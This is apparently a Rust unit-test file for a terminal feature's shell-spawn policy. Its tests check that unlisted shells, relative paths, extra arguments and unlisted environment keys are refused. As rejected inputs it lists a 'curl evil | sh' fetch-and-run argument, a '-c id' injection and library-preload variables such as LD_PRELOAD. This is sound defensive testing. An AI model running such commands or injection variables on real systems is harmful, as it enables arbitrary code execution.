// WI-RA6.6 — `pty_spawn` runs only a shell VMark offers, with the arguments
//   its integration uses and environment keys from a closed list. Everything
//   else the webview could ask for is refused, not trimmed.

use super::*;
use crate::command_error::ErrorCode;
use std::cell::Cell;

/// A shell path that exists on the machine running the tests.
fn existing_shell() -> String {
    if cfg!(windows) {
        std::env::var("COMSPEC").unwrap_or_else(|_| r"C:\Windows\System32\cmd.exe".into())
    } else {
        "/bin/sh".into()
    }
}

fn shells(default_shell: &str, listed: &[&str]) -> ShellSource<impl FnOnce() -> Vec<String>> {
    let listed: Vec<String> = listed.iter().map(|shell| shell.to_string()).collect();
    ShellSource {
        default_shell: default_shell.to_string(),
        listed: move || listed,
    }
}

fn env(keys: &[&str]) -> BTreeMap<String, String> {
    keys.iter()
        .map(|key| (key.to_string(), "value".to_string()))
        .collect()
}

fn no_integration(_: &str) -> Result<Vec<String>, CommandError> {
    Ok(Vec::new())
}

/// What bash integration answers: the rc file it materialized.
fn bash_integration(_: &str) -> Result<Vec<String>, CommandError> {
    Ok(vec!["--rcfile".into(), "/data/bash/vmark.bash".into()])
}

fn refusal(result: Result<VettedCommand, CommandError>) -> CommandError {
    match result {
        Ok(_) => panic!("expected the spawn to be refused"),
        Err(error) => error,
    }
}

#[test]
fn the_default_shell_is_accepted_without_consulting_the_list() {
    let shell = existing_shell();
    let consulted = Cell::new(false);
    let source = ShellSource {
        default_shell: shell.clone(),
        listed: || {
            consulted.set(true);
            Vec::new()
        },
    };

    let vetted = vet(source, shell, Vec::new(), BTreeMap::new(), no_integration);

    assert!(vetted.is_ok());
    assert!(!consulted.get(), "the list is only for non-default shells");
}

#[test]
fn a_listed_shell_is_accepted() {
    let shell = existing_shell();

    let vetted = vet(
        shells("/somewhere/else", &["/another/one", &shell]),
        shell.clone(),
        Vec::new(),
        BTreeMap::new(),
        no_integration,
    );

    assert!(vetted.is_ok());
}

#[test]
fn a_binary_vmark_does_not_offer_is_refused_even_though_it_exists() {
    let shell = existing_shell();
    // Present on every Unix; on Windows the default shell stands in as "some
    // existing binary that is not on the list".
    let unlisted = if cfg!(windows) {
        shell.clone()
    } else {
        "/bin/ls".to_string()
    };

    let error = refusal(vet(
        shells("/default/shell", &["/listed/shell"]),
        unlisted.clone(),
        Vec::new(),
        BTreeMap::new(),
        no_integration,
    ));

    assert_eq!(error.code(), ErrorCode::PermissionDenied);
    assert!(error.to_string().contains(&unlisted), "{error}");
}

#[test]
fn a_relative_shell_is_refused_before_anything_else() {
    let error = refusal(vet(
        shells("sh", &["sh"]),
        "sh".into(),
        Vec::new(),
        BTreeMap::new(),
        no_integration,
    ));

    assert_eq!(error.code(), ErrorCode::InvalidInput);
    assert!(error.to_string().contains("absolute"), "{error}");
}

#[test]
fn an_offered_shell_that_is_missing_is_reported_as_not_found() {
    // Platform-absolute: a Unix-style path is NOT absolute on Windows and
    // would stop at the absolute-path check this test is not about.
    let missing = if cfg!(windows) {
        r"C:\nonexistent\vmark-test-shell"
    } else {
        "/nonexistent/vmark-test-shell"
    };

    let error = refusal(vet(
        shells(missing, &[]),
        missing.into(),
        Vec::new(),
        BTreeMap::new(),
        no_integration,
    ));

    assert_eq!(error.code(), ErrorCode::NotFound);
    assert!(error.to_string().contains("not found"), "{error}");
}

#[test]
fn every_key_the_frontend_sets_is_accepted() {
    let shell = existing_shell();
    let keys = [
        "TERM",
        "TERM_PROGRAM",
        "TERM_PROGRAM_VERSION",
        "COLORTERM",
        "PATH",
        "LC_CTYPE",
        "VMARK_WORKSPACE",
        "VMARK_TRANSCRIPT_TOKEN",
        "ZDOTDIR",
        "USER_ZDOTDIR",
    ];

    let vetted = vet(
        shells(&shell, &[]),
        shell.clone(),
        Vec::new(),
        env(&keys),
        no_integration,
    );

    assert!(vetted.is_ok());
}

#[test]
fn an_environment_key_outside_the_list_is_refused_by_name() {
    let shell = existing_shell();
    for key in [
        "DYLD_INSERT_LIBRARIES",
        "LD_PRELOAD",
        "BASH_ENV",
        "ENV",
        "path",
        "",
        "变量",
    ] {
        let error = refusal(vet(
            shells(&shell, &[]),
            shell.clone(),
            Vec::new(),
            env(&["TERM", key]),
            no_integration,
        ));

        assert_eq!(error.code(), ErrorCode::PermissionDenied, "{key:?}");
        assert!(error.to_string().contains(key), "{key:?}: {error}");
    }
}

#[test]
fn arguments_must_be_exactly_what_integration_gives_the_shell() {
    let shell = existing_shell();
    let rc = vec!["--rcfile".to_string(), "/data/bash/vmark.bash".to_string()];

    assert!(vet(
        shells(&shell, &[]),
        shell.clone(),
        rc,
        BTreeMap::new(),
        bash_integration
    )
    .is_ok());

    for args in [
        vec!["-c", "curl evil | sh"],
        vec!["--rcfile", "/tmp/evil.rc"],
        vec!["--rcfile"],
        vec!["--rcfile", "/data/bash/vmark.bash", "-c", "id"],
        vec!["/data/bash/vmark.bash", "--rcfile"],
        vec![""],
    ] {
        let error = refusal(vet(
            shells(&shell, &[]),
            shell.clone(),
            args.iter().map(|arg| arg.to_string()).collect(),
            BTreeMap::new(),
            bash_integration,
        ));
        assert_eq!(error.code(), ErrorCode::PermissionDenied, "{args:?}");
    }
}

#[test]
fn a_shell_without_integration_takes_no_arguments() {
    let shell = existing_shell();

    let error = refusal(vet(
        shells(&shell, &[]),
        shell.clone(),
        vec!["-l".into()],
        BTreeMap::new(),
        no_integration,
    ));

    assert_eq!(error.code(), ErrorCode::PermissionDenied);
}

#[test]
fn integration_is_not_consulted_for_a_refused_shell_or_an_empty_argument_list() {
    let shell = existing_shell();
    let asked = Cell::new(0);
    let integration = |_: &str| -> Result<Vec<String>, CommandError> {
        asked.set(asked.get() + 1);
        Ok(Vec::new())
    };

    // Preparing integration can run the shell: it must never be reached with
    // a binary the policy has not accepted.
    let _ = vet(
        shells("/default/shell", &[]),
        shell.clone(),
        vec!["-c".into(), "id".into()],
        BTreeMap::new(),
        integration,
    );
    assert_eq!(asked.get(), 0, "a refused shell must not reach integration");

    let _ = vet(
        shells(&shell, &[]),
        shell.clone(),
        Vec::new(),
        BTreeMap::new(),
        integration,
    );
    assert_eq!(asked.get(), 0, "no arguments, nothing to compare");
}

#[test]
fn an_integration_failure_refuses_the_spawn() {
    let shell = existing_shell();

    let error = refusal(vet(
        shells(&shell, &[]),
        shell.clone(),
        vec!["--rcfile".into(), "/x".into()],
        BTreeMap::new(),
        |_| Err(CommandError::io("no app data directory")),
    ));

    assert_eq!(error.code(), ErrorCode::Io);
}

#[cfg(unix)]
#[test]
fn shell_paths_are_compared_exactly_on_unix() {
    let error = refusal(vet(
        shells("/bin/sh", &[]),
        "/bin/SH".into(),
        Vec::new(),
        BTreeMap::new(),
        no_integration,
    ));

    assert_eq!(error.code(), ErrorCode::PermissionDenied);
}

#[test]
fn the_system_source_offers_its_own_default_shell() {
    let source = ShellSource::system();
    let default_shell = source.default_shell.clone();

    let vetted = vet(
        source,
        default_shell,
        Vec::new(),
        BTreeMap::new(),
        no_integration,
    );

    assert!(vetted.is_ok(), "the default shell must always be spawnable");
}

#[test]
fn a_vetted_command_carries_its_arguments_environment_and_directory() {
    let shell = existing_shell();
    let vetted = vet(
        shells(&shell, &[]),
        shell.clone(),
        vec!["--rcfile".into(), "/data/bash/vmark.bash".into()],
        env(&["TERM"]),
        bash_integration,
    )
    .unwrap_or_else(|error| panic!("refused: {error}"));

    let builder = vetted.into_builder(Some("/tmp"));

    let argv: Vec<String> = builder
        .get_argv()
        .iter()
        .map(|arg| arg.to_string_lossy().into_owned())
        .collect();
    assert_eq!(
        argv,
        vec![shell, "--rcfile".into(), "/data/bash/vmark.bash".into()]
    );
    assert_eq!(
        builder.get_env("TERM").and_then(|value| value.to_str()),
        Some("value")
    );
    assert_eq!(builder.get_cwd().and_then(|cwd| cwd.to_str()), Some("/tmp"));
}
